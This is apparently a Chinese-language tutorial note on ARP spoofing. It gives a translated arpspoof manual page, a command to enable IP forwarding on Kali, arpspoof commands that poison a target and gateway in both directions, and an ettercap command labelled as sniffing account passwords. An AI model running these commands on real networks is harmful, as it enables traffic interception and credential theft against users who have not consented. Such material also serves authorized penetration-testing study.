```bash
名字 
       arpspoof - 截获交换局域网中的数据包

用法
       arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host

描述
       arpspoof通过伪造的ARP响应包改变局域网中从目标主机（或所有主机）到另一个主机（host）的数据包转发路径。这是交换局域网中嗅探网络流量的一种极为有效的方法。
       内核IP转发（或如fragrouter这样的、用户层面的、能完成同样功能的软件）必须提前开启。

参数
       -i interface
              指定要使用的接口（即指定一块网卡）

       -c own|host|both
              指定在恢复ARP配置时使用的硬件地址；当在清理（cleaning up）时，数据包的源地址可以用自己的也可以用主机（host）的硬件地址。
              使用伪造的硬件地址可能导致某些配置下的交换网络、AP网络或桥接网络通信中断，然而它比起默认值————使用自己的硬件地址要工作地更为可靠。

       -t target
              指定一个特殊的、将被ARP毒化的主机（如果没有指定，则认为是局域网中所有主机）。重复可以指定多个主机。

       -r     毒化两个主机（目标和主机（host））以捕获两个方向的网络流量。（仅仅在和-t参数一起使用时有效）

       host   host是你想要截获数据包的主机 (通常是网关)。
```



进行arp欺骗前使用如下命令开启ip转发功能（kali下）

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

/proc/sys/net/ipv4/ip_forward是配置文件，默认内容为0，表示IP转发是关闭的，，使用上述命令将该配置文件的内容改写为1，表示开启IP转发。开启IP转发后 流量会经过kali的主机而后再去到目标所以这时开启arpspoof 那么目标就不会断网，因为流量通过了kali主机那么我们就可以拦截相关数据。



### 常用命令：

开启IP转发之后，同样使用断网攻击的命令进行ARP欺骗：

```bash
 arpspoof   -i   网卡   -t    目标IP    网关
 反向欺骗：
 arpspoof   -i   网卡   -t    网关    目标IP
```



```bash
ettercap -Tq -i eth0 #进行账号密码嗅探
```

